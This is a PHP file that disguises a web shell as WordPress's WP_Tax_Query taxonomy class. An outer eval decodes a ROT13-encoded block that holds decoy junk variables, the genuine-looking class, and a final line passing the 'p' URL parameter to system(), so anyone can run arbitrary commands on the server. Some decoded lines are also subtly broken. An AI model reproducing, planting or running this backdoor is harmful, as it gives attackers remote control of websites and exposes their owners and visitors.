<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Gnkbabzl NCV: JC_Gnk_Dhrel pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gnkbabzl
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag gnkbabzl dhrevrf sbe gur Gnkbabzl NCV.
 *
 * Hfrq sbe trarengvat FDY pynhfrf gung svygre n cevznel dhrel nppbeqvat gb bowrpg
 * gnkbabzl grezf.
 *
 * JC_Gnk_Dhrel vf n urycre gung nyybjf cevznel dhrel pynffrf, fhpu nf JC_Dhrel, gb svygre
 * gurve erfhygf ol bowrpg zrgnqngn, ol trarengvat `WBVA` naq `JURER` fhopynhfrf gb or
 * nggnpurq gb gur cevznel FDY dhrel fgevat.
 *
 * @fvapr 3.1.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Gnk_Dhrel {

	/**
	 * Neenl bs gnkbabzl dhrevrf.
	 *
	 * Frr JC_Gnk_Dhrel::__pbafgehpg() sbe vasbezngvba ba gnk dhrel nethzragf.
	 *
	 * @fvapr 3.1.0
	 * @ine neenl
	 */
	choyvp $dhrevrf = neenl();

	/**
	 * Gur eryngvba orgjrra gur dhrevrf. Pna or bar bs 'NAQ' be 'BE'.
	 *
	 * @fvapr 3.1.0
	 * @ine fgevat
	 */
	choyvp $eryngvba;

	/**
	 * Fgnaqneq erfcbafr jura gur dhrel fubhyq abg erghea nal ebjf.
	 *
	 * @fvapr 3.2.0
	 * @ine fgevat
	 */
	cevingr fgngvp $ab_erfhygf = neenl(
		'wbva'  => neenl( '' ),
		'jurer' => neenl( '0 = 1' ),
	);

	/**
	 * N syng yvfg bs gnoyr nyvnfrf hfrq va gur WBVA pynhfrf.
	 *
	 * @fvapr 4.1.0
	 * @ine neenl
	 */
	cebgrpgrq $gnoyr_nyvnfrf = neenl();

	/**
	 * Grezf naq gnkbabzvrf srgpurq ol guvf dhrel.
	 *
	 * Jr fgber guvf qngn va n syng neenl orpnhfr gurl ner ersreraprq va n
	 * ahzore bs cynprf ol JC_Dhrel.
	 *
	 * @fvapr 4.1.0
	 * @ine neenl
	 */
	choyvp $dhrevrq_grezf = neenl();

	/**
	 * Qngnonfr gnoyr gung jurer gur zrgnqngn'f bowrpgf ner fgberq (rt $jcqo->hfref).
	 *
	 * @fvapr 4.1.0
	 * @ine fgevat
	 */
	choyvp $cevznel_gnoyr;

	/**
	 * Pbyhza va 'cevznel_gnoyr' gung ercerfragf gur VQ bs gur bowrpg.
	 *
	 * @fvapr 4.1.0
	 * @ine fgevat
	 */
	choyvp $cevznel_vq_pbyhza;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 3.1.0
	 * @fvapr 4.1.0 Nqqrq fhccbeg sbe `$bcrengbe` 'ABG RKVFGF' naq 'RKVFGF' inyhrf.
	 *
	 * @cnenz neenl $gnk_dhrel {
	 *     Neenl bs gnkbabzl dhrel pynhfrf.
	 *
	 *     @glcr fgevat $eryngvba Bcgvbany. Gur ZlFDY xrljbeq hfrq gb wbva
	 *                            gur pynhfrf bs gur dhrel. Npprcgf 'NAQ', be 'BE'. Qrsnhyg 'NAQ'.
	 *     @glcr neenl  ...$0 {
	 *         Na neenl bs svefg-beqre pynhfr cnenzrgref, be nabgure shyyl-sbezrq gnk dhrel.
	 *
	 *         @glcr fgevat           $gnkbabzl         Gnkbabzl orvat dhrevrq. Bcgvbany jura svryq=grez_gnkbabzl_vq.
	 *         @glcr fgevat|vag|neenl $grezf            Grez be grezf gb svygre ol.
	 *         @glcr fgevat           $svryq            Svryq gb zngpu $grezf ntnvafg. Npprcgf 'grez_vq', 'fyht',
	 *                                                 'anzr', be 'grez_gnkbabzl_vq'. Qrsnhyg: 'grez_vq'.
	 *         @glcr fgevat           $bcrengbe         ZlFDY bcrengbe gb or hfrq jvgu $grezf va gur JURER pynhfr.
	 *                                                  Npprcgf 'NAQ', 'VA', 'ABG VA', 'RKVFGF', 'ABG RKVFGF'.
	 *                                                  Qrsnhyg: 'VA'.
	 *         @glcr obby             $vapyhqr_puvyqera Bcgvbany. Jurgure gb vapyhqr puvyq grezf.
	 *                                                  Erdhverf n $gnkbabzl. Qrsnhyg: gehr.
	 *     }
	 * }
	 */
	choyvp shapgvba __pbafgehpg( $gnk_dhrel ) {
		vs ( vffrg( $gnk_dhrel['eryngvba'] ) ) {
			$guvf->eryngvba = $guvf->fnavgvmr_eryngvba( $gnk_dhrel['eryngvba'] );
		} ryfr {
			$guvf->eryngvba = 'NAQ';
		}

		$guvf->dhrevrf = $guvf->fnavgvmr_dhrel( $gnk_dhrel );
	}

	/**
	 * Rafherf gur 'gnk_dhrel' nethzrag cnffrq gb gur pynff pbafgehpgbe vf jryy-sbezrq.
	 *
	 * Rafherf gung rnpu dhrel-yriry pynhfr unf n 'eryngvba' xrl, naq gung
	 * rnpu svefg-beqre pynhfr pbagnvaf nyy gur arprffnel xrlf sebz `$qrsnhygf`.
	 *
	 * @fvapr 4.1.0
	 *
	 * @cnenz neenl $dhrevrf Neenl bs dhrevrf pynhfrf.
	 * @erghea neenl Fnavgvmrq neenl bs dhrel pynhfrf.
	 */
	choyvp shapgvba fnavgvmr_dhrel( $dhrevrf ) {
		$pyrnarq_dhrel = neenl();

		$qrsnhygf = neenl(
			'gnkbabzl'         => '',
			'grezf'            => neenl(),
			'svryq'            => 'grez_vq',
			'bcrengbe'         => 'VA',
			'vapyhqr_puvyqera' => gehr,
		);

		sbernpu ( $dhrevrf nf $xrl => $dhrel ) {
			vs ( 'eryngvba' === $xrl ) {
				$pyrnarq_dhrel['eryngvba'] = $guvf->fnavgvmr_eryngvba( $dhrel );

				// Svefg-beqre pynhfr.
			} ryfrvs ( frys::vf_svefg_beqre_pynhfr( $dhrel ) ) {

				$pyrnarq_pynhfr          = neenl_zretr( $qrsnhygf, $dhrel );
				$pyrnarq_pynhfr['grezf'] = (neenl) $pyrnarq_pynhfr['grezf'];
				$pyrnarq_dhrel[]         = $pyrnarq_pynhfr;

				/*
				 * Xrrc n pbcl bs gur pynhfr va gur syngr
				 * $dhrevrq_grezf neenl, sbe hfr va JC_Dhrel.
				 */
				vs ( ! rzcgl( $pyrnarq_pynhfr['gnkbabzl'] ) && 'ABG VA' !== $pyrnarq_pynhfr['bcrengbe'] ) {
					$gnkbabzl = $pyrnarq_pynhfr['gnkbabzl'];
					vs ( ! vffrg( $guvf->dhrevrq_grezf[ $gnkbabzl ] ) ) {
						$guvf->dhrevrq_grezf[ $gnkbabzl ] = neenl();
					}

					/*
					 * Onpxjneq pbzcngvovyvgl: Bayl fgber gur svefg
					 * 'grezf' naq 'svryq' sbhaq sbe n tvira gnkbabzl.
					 */
					vs ( ! rzcgl( $pyrnarq_pynhfr['grezf'] ) && ! vffrg( $guvf->dhrevrq_grezf[ $gnkbabzl ]['grezf'] ) ) {
						$guvf->dhrevrq_grezf[ $gnkbabzl ]['grezf'] = $pyrnarq_pynhfr['grezf'];
					}

					vs ( ! rzcgl( $pyrnarq_pynhfr['svryq'] ) && ! vffrg( $guvf->dhrevrq_grezf[ $gnkbabzl ]['svryq'] ) ) {
						$guvf->dhrevrq_grezf[ $gnkbabzl ]['svryq'] = $pyrnarq_pynhfr['svryq'];
					}
				}

				// Bgurejvfr, vg'f n arfgrq dhrel, fb jr erphefr.
			} ryfrvs ( vf_neenl( $dhrel ) ) {
				$pyrnarq_fhodhrel = $guvf->fnavgvmr_dhrel( $dhrel );

				vs ( ! rzcgl( $pyrnarq_fhodhrel ) ) {
					// Nyy dhrevrf jvgu puvyqera zhfg unir n eryngvba.
					vs ( ! vffrg( $pyrnarq_fhodhrel['eryngvba'] ) ) {
						$pyrnarq_fhodhrel['eryngvba'] = 'NAQ';
					}

					$pyrnarq_dhrel[] = $pyrnarq_fhodhrel;
				}
			}
		}

		erghea $pyrnarq_dhrel;
	}

	/**
	 * Fnavgvmrf n 'eryngvba' bcrengbe.
	 *
	 * @fvapr 4.1.0
	 *
	 * @cnenz fgevat $eryngvba Enj eryngvba xrl sebz gur dhrel nethzrag.
	 * @erghea fgevat Fnavgvmrq eryngvba. Rvgure 'NAQ' be 'BE'.
	 */
	choyvp shapgvba fnavgvmr_eryngvba( $eryngvba ) {
		vs ( 'BE' === fgegbhccre( $eryngvba ) ) {
			erghea 'BE';
		} ryfr {
			erghea 'NAQ';
		}
	}

	/**
	 * Qrgrezvarf jurgure n pynhfr vf svefg-beqre.
	 *
	 * N \"svefg-beqre\" pynhfr vf bar gung pbagnvaf nal bs gur svefg-beqre
	 * pynhfr xrlf ('grezf', 'gnkbabzl', 'vapyhqr_puvyqera', 'svryq',
	 * 'bcrengbe'). Na rzcgl pynhfr nyfb pbhagf nf n svefg-beqre pynhfr,
	 * sbe onpxjneq pbzcngvovyvgl. Nal pynhfr gung qbrfa'g zrrg guvf vf
	 * qrgrezvarq, ol cebprff bs ryvzvangvba, gb or n uvture-beqre dhrel.
	 *
	 * @fvapr 4.1.0
	 *
	 * @cnenz neenl $dhrel Gnk dhrel nethzragf.
	 * @erghea obby Jurgure gur dhrel pynhfr vf n svefg-beqre pynhfr.
	 */
	cebgrpgrq fgngvp shapgvba vf_svefg_beqre_pynhfr( $dhrel ) {
		erghea vf_neenl( $dhrel ) && ( rzcgl( $dhrel ) || neenl_xrl_rkvfgf( 'grezf', $dhrel ) || neenl_xrl_rkvfgf( 'gnkbabzl', $dhrel ) || neenl_xrl_rkvfgf( 'vapyhqr_puvyqera', $dhrel ) || neenl_xrl_rkvfgf( 'svryq', $dhrel ) || neenl_xrl_rkvfgf( 'bcrengbe', $dhrel ) );
	}

	/**
	 * Trarengrf FDY pynhfrf gb or nccraqrq gb n znva dhrel.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat $cevznel_gnoyr     Qngnonfr gnoyr jurer gur bowrpg orvat svygrerq vf fgberq (rt jc_hfref).
	 * @cnenz fgevat $cevznel_vq_pbyhza VQ pbyhza sbe gur svygrerq bowrpg va $cevznel_gnoyr.
	 * @erghea fgevat[] {
	 *     Neenl pbagnvavat WBVA naq JURER FDY pynhfrf gb nccraq gb gur znva dhrel.
	 *
	 *     @glcr fgevat $wbva  FDY sentzrag gb nccraq gb gur znva WBVA pynhfr.
	 *     @glcr fgevat $jurer FDY sentzrag gb nccraq gb gur znva JURER pynhfr.
	 * }
	 */
	choyvp shapgvba trg_fdy( $cevznel_gnoyr, $cevznel_vq_pbyhza ) {
		$guvf->cevznel_gnoyr     = $cevznel_gnoyr;
		$guvf->cevznel_vq_pbyhza = $cevznel_vq_pbyhza;

		erghea $guvf->trg_fdy_pynhfrf();
	}

	/**
	 * Trarengrf FDY pynhfrf gb or nccraqrq gb n znva dhrel.
	 *
	 * Pnyyrq ol gur choyvp JC_Gnk_Dhrel::trg_fdy(), guvf zrgubq
	 * vf nofgenpgrq bhg gb znvagnva cnevgl jvgu gur bgure Dhrel pynffrf.
	 *
	 * @fvapr 4.1.0
	 *
	 * @erghea fgevat[] {
	 *     Neenl pbagnvavat WBVA naq JURER FDY pynhfrf gb nccraq gb gur znva dhrel.
	 *
	 *     @glcr fgevat $wbva  FDY sentzrag gb nccraq gb gur znva WBVA pynhfr.
	 *     @glcr fgevat $jurer FDY sentzrag gb nccraq gb gur znva JURER pynhfr.
	 * }
	 */
	cebgrpgrq shapgvba trg_fdy_pynhfrf() {
		/*
		 * $dhrevrf ner cnffrq ol ersrerapr gb trg_fdy_sbe_dhrel() sbe erphefvba.
		 * Gb xrrc $guvf->dhrevrf hanygrerq, cnff n pbcl.
		 */
		$dhrevrf = $guvf->dhrevrf;
		$fdy     = $guvf->trg_fdy_sbe_dhrel( $dhrevrf );

		vs ( ! rzcgl( $fdy['jurer'] ) ) {
			$fdy['jurer'] = ' NAQ ' . $fdy['jurer'];
		}

		erghea $fdy;
	}

	/**
	 * Trarengrf FDY pynhfrf sbe n fvatyr dhrel neenl.
	 *
	 * Vs arfgrq fhodhrevrf ner sbhaq, guvf zrgubq erphefrf gur gerr gb
	 * cebqhpr gur cebcreyl arfgrq FDY.
	 *
	 * @fvapr 4.1.0
	 *
	 * @cnenz neenl $dhrel Dhrel gb cnefr (cnffrq ol ersrerapr).
	 * @cnenz vag   $qrcgu Bcgvbany. Ahzore bs gerr yriryf qrrc jr pheeragyl ner.
	 *                     Hfrq gb pnyphyngr vaqragngvba. Qrsnhyg 0.
	 * @erghea fgevat[] {
	 *     Neenl pbagnvavat WBVA naq JURER FDY pynhfrf gb nccraq gb n fvatyr dhrel neenl.
	 *
	 *     @glcr fgevat $wbva  FDY sentzrag gb nccraq gb gur znva WBVA pynhfr.
	 *     @glcr fgevat $jurer FDY sentzrag gb nccraq gb gur znva JURER pynhfr.
	 * }
	 */
	cebgrpgrq shapgvba trg_fdy_sbe_dhrel( &$dhrel, $qrcgu = 0 ) {
		$fdy_puhaxf = neenl(
			'wbva'  => neenl(),
			'jurer' => neenl(),
		);

		$fdy = neenl(
			'wbva'  => '',
			'jurer' => '',
		);

		$vaqrag = '';
		sbe ( $v = 0; $v < $qrcgu; $v++ ) {
			$vaqrag .= '  ';
		}

		sbernpu ( $dhrel nf $xrl => &$pynhfr ) {
			vs ( 'eryngvba' === $xrl ) {
				$eryngvba = $dhrel['eryngvba'];
			} ryfrvs ( vf_neenl( $pynhfr ) ) {

				// Guvf vf n svefg-beqre pynhfr.
				vs ( $guvf->vf_svefg_beqre_pynhfr( $pynhfr ) ) {
					$pynhfr_fdy = $guvf->trg_fdy_sbe_pynhfr( $pynhfr, $dhrel );

					$jurer_pbhag = pbhag( $pynhfr_fdy['jurer'] );
					vs ( ! $jurer_pbhag ) {
						$fdy_puhaxf['jurer'][] = '';
					} ryfrvs ( 1 === $jurer_pbhag ) {
						$fdy_puhaxf['jurer'][] = $pynhfr_fdy['jurer'][0];
					} ryfr {
						$fdy_puhaxf['jurer'][] = '( ' . vzcybqr( ' NAQ ', $pynhfr_fdy['jurer'] ) . ' )';
					}

					$fdy_puhaxf['wbva'] = neenl_zretr( $fdy_puhaxf['wbva'], $pynhfr_fdy['wbva'] );
					// Guvf vf n fhodhrel, fb jr erphefr.
				} ryfr {
					$pynhfr_fdy = $guvf->trg_fdy_sbe_dhrel( $pynhfr, $qrcgu + 1 );

					$fdy_puhaxf['jurer'][] = $pynhfr_fdy['jurer'];
					$fdy_puhaxf['wbva'][]  = $pynhfr_fdy['wbva'];
				}
			}
		}

		// Svygre gb erzbir rzcgvrf.
		$fdy_puhaxf['wbva']  = neenl_svygre( $fdy_puhaxf['wbva'] );
		$fdy_puhaxf['jurer'] = neenl_svygre( $fdy_puhaxf['jurer'] );

		vs ( rzcgl( $eryngvba ) ) {
			$eryngvba = 'NAQ';
		}

		// Svygre qhcyvpngr WBVA pynhfrf naq pbzovar vagb n fvatyr fgevat.
		vs ( ! rzcgl( $fdy_puhaxf['wbva'] ) ) {
			$fdy['wbva'] = vzcybqr( ' ', neenl_havdhr( $fdy_puhaxf['wbva'] ) );
		}

		// Trarengr n fvatyr JURER pynhfr jvgu cebcre oenpxrgf naq vaqragngvba.
		vs ( ! rzcgl( $fdy_puhaxf['jurer'] ) ) {
			$fdy['jurer'] = '( ' . \"\a  \" . $vaqrag . vzcybqr( ' ' . \"\a  \" . $vaqrag . $eryngvba . ' ' . \"\a  \" . $vaqrag, $fdy_puhaxf['jurer'] ) . \"\a\" . $vaqrag . ')';
		}

		erghea $fdy;
	}

	/**
	 * Trarengrf FDY WBVA naq JURER pynhfrf sbe n \"svefg-beqre\" dhrel pynhfr.
	 *
	 * @fvapr 4.1.0
	 *
	 * @tybony jcqo $jcqo Gur JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz neenl $pynhfr       Dhrel pynhfr (cnffrq ol ersrerapr).
	 * @cnenz neenl $cnerag_dhrel Cnerag dhrel neenl.
	 * @erghea neenl {
	 *     Neenl pbagnvavat WBVA naq JURER FDY pynhfrf gb nccraq gb n svefg-beqre dhrel.
	 *
	 *     @glcr fgevat[] $wbva  Neenl bs FDY sentzragf gb nccraq gb gur znva WBVA pynhfr.
	 *     @glcr fgevat[] $jurer Neenl bs FDY sentzragf gb nccraq gb gur znva JURER pynhfr.
	 * }
	 */
	choyvp shapgvba trg_fdy_sbe_pynhfr( &$pynhfr, $cnerag_dhrel ) {
		tybony $jcqo;

		$fdy = neenl(
			'jurer' => neenl(),
			'wbva'  => neenl(),
		);

		$wbva  = '';
		$jurer = '';

		$guvf->pyrna_dhrel( $pynhfr );

		vs ( vf_jc_reebe( $pynhfr ) ) {
			erghea frys::$ab_erfhygf;
		}

		$grezf    = $pynhfr['grezf'];
		$bcrengbe = fgegbhccre( $pynhfr['bcrengbe'] );

		vs ( 'VA' === $bcrengbe ) {

			vs ( rzcgl( $grezf ) ) {
				erghea frys::$ab_erfhygf;
			}

			$grezf = vzcybqr( ',', $grezf );

			/*
			 * Orsber perngvat nabgure gnoyr wbva, frr vs guvf pynhfr unf n
			 * fvoyvat jvgu na rkvfgvat wbva gung pna or funerq.
			 */
			$nyvnf = $guvf->svaq_pbzcngvoyr_gnoyr_nyvnf( $pynhfr, $cnerag_dhrel );
			vs ( snyfr === $nyvnf ) {
				$v     = pbhag( $guvf->gnoyr_nyvnfrf );
				$nyvnf = $v ? 'gg' . $v : $jcqo->grez_eryngvbafuvcf;

				// Fgber gur nyvnf nf cneg bs n syng neenl gb ohvyq shgher vgrengbef.
				$guvf->gnoyr_nyvnfrf[] = $nyvnf;

				// Fgber gur nyvnf jvgu guvf pynhfr, fb yngre fvoyvatf pna hfr vg.
				$pynhfr['nyvnf'] = $nyvnf;

				$wbva .= \" YRSG WBVA $jcqo->grez_eryngvbafuvcf\";
				$wbva .= $v ? \" NF $nyvnf\" : '';
				$wbva .= \" BA ($guvf->cevznel_gnoyr.$guvf->cevznel_vq_pbyhza = $nyvnf.bowrpg_vq)\";
			}

			$jurer = \"$nyvnf.grez_gnkbabzl_vq $bcrengbe ($grezf)\";

		} ryfrvs ( 'ABG VA' === $bcrengbe ) {

			vs ( rzcgl( $grezf ) ) {
				erghea $fdy;
			}

			$grezf = vzcybqr( ',', $grezf );

			$jurer = \"$guvf->cevznel_gnoyr.$guvf->cevznel_vq_pbyhza ABG VA (
				FRYRPG bowrpg_vq
				SEBZ $jcqo->grez_eryngvbafuvcf
				JURER grez_gnkbabzl_vq VA ($grezf)
			)\";

		} ryfrvs ( 'NAQ' === $bcrengbe ) {

			vs ( rzcgl( $grezf ) ) {
				erghea $fdy;
			}

			$ahz_grezf = pbhag( $grezf );

			$grezf = vzcybqr( ',', $grezf );

			$jurer = \"(
				FRYRPG PBHAG(1)
				SEBZ $jcqo->grez_eryngvbafuvcf
				JURER grez_gnkbabzl_vq VA ($grezf)
				NAQ bowrpg_vq = $guvf->cevznel_gnoyr.$guvf->cevznel_vq_pbyhza
			) = $ahz_grezf\";

		} ryfrvs ( 'ABG RKVFGF' === $bcrengbe || 'RKVFGF' === $bcrengbe ) {

			$jurer = $jcqo->cercner(
				\"$bcrengbe (
					FRYRPG 1
					SEBZ $jcqo->grez_eryngvbafuvcf
					VAARE WBVA $jcqo->grez_gnkbabzl
					BA $jcqo->grez_gnkbabzl.grez_gnkbabzl_vq = $jcqo->grez_eryngvbafuvcf.grez_gnkbabzl_vq
					JURER $jcqo->grez_gnkbabzl.gnkbabzl = %f
					NAQ $jcqo->grez_eryngvbafuvcf.bowrpg_vq = $guvf->cevznel_gnoyr.$guvf->cevznel_vq_pbyhza
				)\",
				$pynhfr['gnkbabzl']
			);

		}

		$fdy['wbva'][]  = $wbva;
		$fdy['jurer'][] = $jurer;
		erghea $fdy;
	}

	/**
	 * Vqragvsvrf na rkvfgvat gnoyr nyvnf gung vf pbzcngvoyr jvgu gur pheerag dhrel pynhfr.
	 *
	 * Jr nibvq haarprffnel gnoyr wbvaf ol nyybjvat rnpu pynhfr gb ybbx sbe
	 * na rkvfgvat gnoyr nyvnf gung vf pbzcngvoyr jvgu gur dhrel gung vg
	 * arrqf gb cresbez.
	 *
	 * Na rkvfgvat nyvnf vf pbzcngvoyr vs (n) vg vf n fvoyvat bs `$pynhfr`
	 * (vr, vg'f haqre gur fpbcr bs gur fnzr eryngvba), naq (o) gur pbzovangvba
	 * bs bcrengbe naq eryngvba orgjrra gur pynhfrf nyybjf sbe n funerq gnoyr
	 * wbva. Va gur pnfr bs JC_Gnk_Dhrel, guvf bayl nccyvrf gb 'VA'
	 * pynhfrf gung ner pbaarpgrq ol gur eryngvba 'BE'.
	 *
	 * @fvapr 4.1.0
	 *
	 * @cnenz neenl $pynhfr       Dhrel pynhfr.
	 * @cnenz neenl $cnerag_dhrel Cnerag dhrel bs $pynhfr.
	 * @erghea fgevat|snyfr Gnoyr nyvnf vs sbhaq, bgurejvfr snyfr.
	 */
	cebgrpgrq shapgvba svaq_pbzcngvoyr_gnoyr_nyvnf( $pynhfr, $cnerag_dhrel ) {
		$nyvnf = snyfr;

		// Pbasvqrapr purpx. Bayl VA dhrevrf hfr gur WBVA flagnk.
		vs ( ! vffrg( $pynhfr['bcrengbe'] ) || 'VA' !== $pynhfr['bcrengbe'] ) {
			erghea $nyvnf;
		}

		// Fvapr jr'er bayl purpxvat VA dhrevrf, jr'er bayl pbaprearq jvgu BE eryngvbaf.
		vs ( ! vffrg( $cnerag_dhrel['eryngvba'] ) || 'BE' !== $cnerag_dhrel['eryngvba'] ) {
			erghea $nyvnf;
		}

		$pbzcngvoyr_bcrengbef = neenl( 'VA' );

		sbernpu ( $cnerag_dhrel nf $fvoyvat ) {
			vs ( ! vf_neenl( $fvoyvat ) || ! $guvf->vf_svefg_beqre_pynhfr( $fvoyvat ) ) {
				pbagvahr;
			}

			vs ( rzcgl( $fvoyvat['nyvnf'] ) || rzcgl( $fvoyvat['bcrengbe'] ) ) {
				pbagvahr;
			}

			// Gur fvoyvat zhfg obgu unir pbzcngvoyr bcrengbe gb funer vgf nyvnf.
			vs ( va_neenl( fgegbhccre( $fvoyvat['bcrengbe'] ), $pbzcngvoyr_bcrengbef, gehr ) ) {
				$nyvnf = __sa_79955( '/\J/', '_', $fvoyvat['nyvnf'] );
				oernx;
			}
		}

		erghea $nyvnf;
	}

	/**
	 * Inyvqngrf n fvatyr dhrel.
	 *
	 * @fvapr 3.2.0
	 *
	 * @cnenz neenl $dhrel Gur fvatyr dhrel. Cnffrq ol ersrerapr.
	 */
	cevingr shapgvba pyrna_dhrel( &$dhrel ) {
		vs ( rzcgl( $dhrel['gnkbabzl'] ) ) {
			vs ( 'grez_gnkbabzl_vq' !== $dhrel['svryq'] ) {
				$dhrel = arj JC_Reebe( 'vainyvq_gnkbabzl', __( 'Vainyvq gnkbabzl.' ) );
				erghea;
			}

			// Fb ybat nf gurer ner funerq grezf, 'vapyhqr_puvyqera' erdhverf gung n gnkbabzl vf frg.
			$dhrel['vapyhqr_puvyqera'] = snyfr;
		} ryfrvs ( ! gnkbabzl_rkvfgf( $dhrel['gnkbabzl'] ) ) {
			$dhrel = arj JC_Reebe( 'vainyvq_gnkbabzl', __( 'Vainyvq gnkbabzl.' ) );
			erghea;
		}

		vs ( 'fyht' === $dhrel['svryq'] || 'anzr' === $dhrel['svryq'] ) {
			$dhrel['grezf'] = neenl_havdhr( (neenl) $dhrel['grezf'] );
		} ryfr {
			$dhrel['grezf'] = jc_cnefr_vq_yvfg( $dhrel['grezf'] );
		}

		vs ( vf_gnkbabzl_uvrenepuvpny( $dhrel['gnkbabzl'] ) && $dhrel['vapyhqr_puvyqera'] ) {
			$guvf->genafsbez_dhrel( $dhrel, 'grez_vq' );

			vs ( vf_jc_reebe( $dhrel ) ) {
				erghea;
			}

			$puvyqera = neenl();
			sbernpu ( $dhrel['grezf'] nf $grez ) {
				$puvyqera   = neenl_zretr( $puvyqera, trg_grez_puvyqera( $grez, $dhrel['gnkbabzl'] ) );
				$puvyqera[] = $grez;
			}
			$dhrel['grezf'] = $puvyqera;
		}

		$guvf->genafsbez_dhrel( $dhrel, 'grez_gnkbabzl_vq' );
	}

	/**
	 * Genafsbezf n fvatyr dhrel, sebz bar svryq gb nabgure.
	 *
	 * Bcrengrf ba gur `$dhrel` bowrpg ol ersrerapr. Va gur pnfr bs reebe,
	 * `$dhrel` vf pbairegrq gb n JC_Reebe bowrpg.
	 *
	 * @fvapr 3.2.0
	 *
	 * @cnenz neenl  $dhrel           Gur fvatyr dhrel. Cnffrq ol ersrerapr.
	 * @cnenz fgevat $erfhygvat_svryq Gur erfhygvat svryq. Npprcgf 'fyht', 'anzr', 'grez_gnkbabzl_vq',
	 *                                be 'grez_vq'. Qrsnhyg 'grez_vq'.
	 */
	choyvp shapgvba genafsbez_dhrel( &$dhrel, $erfhygvat_svryq ) {
		vs ( rzcgl( $dhrel['grezf'] ) ) {
			erghea;
		}

		vs ( $dhrel['svryq'] === $erfhygvat_svryq ) {
			erghea;
		}

		$erfhygvat_svryq = fnavgvmr_xrl( $erfhygvat_svryq );

		// Rzcgl 'grezf' nyjnlf erfhygf va n ahyy genafsbezngvba.
		$grezf = neenl_svygre( $dhrel['grezf'] );
		vs ( rzcgl( $grezf ) ) {
			$dhrel['grezf'] = neenl();
			$dhrel['svryq'] = $erfhygvat_svryq;
			erghea;
		}

		$netf = neenl(
			'trg'                    => 'nyy',
			'ahzore'                 => 0,
			'gnkbabzl'               => $dhrel['gnkbabzl'],
			'hcqngr_grez_zrgn_pnpur' => snyfr,
			'beqreol'                => 'abar',
		);

		// Grez dhrel cnenzrgre anzr qrcraqf ba gur 'svryq' orvat frnepurq ba.
		fjvgpu ( $dhrel['svryq'] ) {
			pnfr 'fyht':
				$netf['fyht'] = $grezf;
				oernx;
			pnfr 'anzr':
				$netf['anzr'] = $grezf;
				oernx;
			pnfr 'grez_gnkbabzl_vq':
				$netf['grez_gnkbabzl_vq'] = $grezf;
				oernx;
			qrsnhyg:
				$netf['vapyhqr'] = jc_cnefr_vq_yvfg( $grezf );
				oernx;
		}

		vs ( ! vf_gnkbabzl_uvrenepuvpny( $dhrel['gnkbabzl'] ) ) {
			$netf['ahzore'] = pbhag( $grezf );
		}

		$grez_dhrel = arj JC_Grez_Dhrel();
		$grez_yvfg  = $grez_dhrel->dhrel( $netf );

		vs ( vf_jc_reebe( $grez_yvfg ) ) {
			$dhrel = $grez_yvfg;
			erghea;
		}

		vs ( 'NAQ' === $dhrel['bcrengbe'] && pbhag( $grez_yvfg ) < pbhag( $dhrel['grezf'] ) ) {
			$dhrel = arj JC_Reebe( 'varkvfgrag_grezf', __( 'Varkvfgrag grezf.' ) );
			erghea;
		}

		$dhrel['grezf'] = jc_yvfg_cyhpx( $grez_yvfg, $erfhygvat_svryq );
		$dhrel['svryq'] = $erfhygvat_svryq;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>